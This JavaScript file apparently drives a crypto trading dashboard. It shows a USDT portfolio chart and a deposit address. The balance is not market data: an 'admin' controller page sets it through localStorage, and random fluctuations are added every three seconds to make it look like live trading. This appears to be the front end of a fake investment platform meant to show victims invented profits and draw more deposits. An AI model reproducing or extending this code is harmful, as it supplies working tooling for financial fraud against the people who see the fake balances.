let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 20.00;
let depositAddress = localStorage.getItem('admin_address') || "0x71C...3a94";
let paymentMethod = localStorage.getItem('admin_method') || "USDT (TRC20)";

// Function to update the text display safely
function updateBalanceDisplay() {
    const display = document.getElementById('balance-display');
    if (display) {
        display.innerText = '$' + currentBalance.toFixed(2);
    }
}

updateBalanceDisplay();

const ctx = document.getElementById('LivePerformanceChart').getContext('2d');

// Standard color constants for the trading chart
const greenColor = 'rgba(16, 185, 129, 1)';
const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
const redColor = 'rgba(239, 68, 68, 1)';
const redGradientStart = 'rgba(239, 68, 68, 0.24)';

// Helper to generate a fresh gradient based on the current market direction
function getChartGradient(colorStart) {
    let gradient = ctx.createLinearGradient(0, 0, 0, 300);
    gradient.addColorStop(0, colorStart);
    gradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
    return gradient;
}

const liveChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
        datasets: [{
            label: 'Portfolio Value (USDT)',
            data: [20, 20.5, 21.2, 22.8, 24.1, currentBalance],
            borderColor: greenColor,
            borderWidth: 3,
            fill: true,
            backgroundColor: getChartGradient(greenGradientStart),
            tension: 0.4
        }]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: { legend: { display: false } }
    }
});

// Real-time market simulation interval loop
setInterval(() => {
    // 1. Check if the controller page has forced a fresh base balance update
    const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
    
    // 2. Simulate micro-movements (random fluctuation between -0.15% and +0.15%)
    const pctChange = (Math.random() * 0.3 - 0.15) / 100;
    const previousBalance = currentBalance;
    
    if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
        currentBalance = controlledBalance;
        localStorage.setItem('_last_processed_controlled', controlledBalance);
    } else {
        currentBalance = currentBalance * (1 + pctChange);
    }

    // 3. Update the data array for the chart's latest point
    liveChart.data.datasets[0].data[liveChart.data.datasets[0].data.length - 1] = currentBalance;
    updateBalanceDisplay();

    // 4. Dynamic color shifting logic based on performance direction
    if (currentBalance >= previousBalance) {
        liveChart.data.datasets[0].borderColor = greenColor;
        liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
    } else {
        liveChart.data.datasets[0].borderColor = redColor;
        liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
    }

    liveChart.update('none'); // Render update smoothly without restarting animations
}, 3000); // Runs automatically every 3 seconds
